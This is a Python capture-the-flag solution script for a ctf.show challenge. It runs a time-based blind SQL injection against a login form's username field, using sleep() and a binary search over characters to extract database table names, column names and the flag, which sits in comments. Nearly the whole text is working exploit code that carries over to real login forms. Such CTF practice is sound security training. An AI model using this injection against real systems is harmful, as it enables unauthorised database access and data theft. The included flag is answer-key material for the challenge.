"""
Author:Y4tacker
"""
import requests

url = "http://fb9c3781-3d21-4e8a-9149-38d2c5447a3b.challenge.ctf.show:8080/api/?page=1&limit=10"

result = ""
i = 0

while 1:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # 查数据库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # banlist,ctfshow_user,flag233333
        # 查表名
        # payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"
        # flagass233
        # 查数据
        payload = "select flagass233 from flag233333"
        # ctfshow{9273b469-0a1e-4d51-a05a-9b93b9735efd}
        data = {
            'username': f"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.05),1)#",
            'password': '4'
        }
        try:
            r = requests.post(url, data=data, timeout=0.9)
            tail = mid
        except Exception as e:
            head = mid + 1
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
